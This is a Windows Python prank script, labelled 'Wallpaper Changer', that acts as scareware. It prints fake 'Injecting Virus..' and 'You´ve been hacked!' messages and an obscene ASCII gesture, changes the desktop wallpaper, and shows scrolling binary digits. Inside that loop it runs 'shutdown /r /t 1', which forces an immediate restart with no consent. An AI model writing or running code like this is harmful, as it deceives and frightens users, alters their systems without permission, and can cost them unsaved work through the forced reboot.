import time
import os       # Wallpaper Changer


    


import os
import ctypes

import subprocess
from ctypes import wintypes

import os
import ctypes
import msvcrt
import subprocess

from ctypes import wintypes

kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
user32 = ctypes.WinDLL('user32', use_last_error=True)

SW_MAXIMIZE = 3

kernel32.GetConsoleWindow.restype = wintypes.HWND
kernel32.GetLargestConsoleWindowSize.restype = wintypes._COORD
kernel32.GetLargestConsoleWindowSize.argtypes = (wintypes.HANDLE,)
user32.ShowWindow.argtypes = (wintypes.HWND, ctypes.c_int)

def maximize_console(lines=None):
    fd = os.open('CONOUT$', os.O_RDWR)
    try:
        hCon = msvcrt.get_osfhandle(fd)
        max_size = kernel32.GetLargestConsoleWindowSize(hCon)
        if max_size.X == 0 and max_size.Y == 0:
            raise ctypes.WinError(ctypes.get_last_error())
    finally:
        os.close(fd)
    cols = max_size.X
    hWnd = kernel32.GetConsoleWindow()
    if cols and hWnd:
        if lines is None:
            lines = max_size.Y
        else:
            lines = max(min(lines, 9999), max_size.Y)
        subprocess.check_call('mode.com con cols={} lines={}'.format(
                                cols, lines))
        user32.ShowWindow(hWnd, SW_MAXIMIZE)




os.system('color 0a')

print("Initalizing...")

time.sleep(3)

print("Loading..")

time.sleep(3)

print("Done Loading!!")

time.sleep(3)

print("Injecting Virus..")

time.sleep(2)

print("You´ve been hacked!")

time.sleep(1)

os.system('color 04')

print("________________$$$$$")
print("______________$$____$$")
print("______________$$____$$")
print("______________$$____$$")
print("______________$$____$$")
print("______________$$____$$")
print("__________$$$$$$____$$$$$$")
print("________$$____$$____$$____$$$$")
print("________$$____$$____$$____$$__$$")
print("$$$$$$__$$____$$____$$____$$____$$")
print("$$____$$$$________________$$____$$")
print("$$______$$______________________$$")
print("__$$____$$______________________$$")
print("___$$$__$$______________________$$")
print("____$$__________________________$$")
print("_____$$$________________________$$")
print("______$$______________________$$$")
print("_______$$$____________________$$")
print("________$$____________________$$")
print("_________$$$________________$$$")
print("__________$$________________$$")
print("__________$$$$$$$$$$$$$$$$$$$$")

time.sleep(3)

os.system('color 0a')

time.sleep(3)

print("GET FUCKED!!!")


drive = "c:\\"
folder = "test"
image = "00-featured-izaya-orihara-durarara-anime.jpg"
image_path = os.path.join(drive, folder, image)

SPI_SETDESKWALLPAPER  = 0x0014
SPIF_UPDATEINIFILE    = 0x0001
SPIF_SENDWININICHANGE = 0x0002

user32 = ctypes.WinDLL('user32')
SystemParametersInfo = user32.SystemParametersInfoW
SystemParametersInfo.argtypes = ctypes.c_uint,ctypes.c_uint,ctypes.c_void_p,ctypes.c_uint
SystemParametersInfo.restype = wintypes.BOOL
print(SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, image_path, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE))



import os
import time
import random

os.system('color 0a')

nums = [1,0]
tm = 0

while tm < 30:
    print(random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),random.randrange(1,5)* " ",
    random.choice(nums),)

    tm = tm + 0.5

    time.sleep(0.5)
    
    print("your pc is unusable!! HAHAHA!")
    
    
    
    os.system("shutdown /r /t 1")
    
    
    

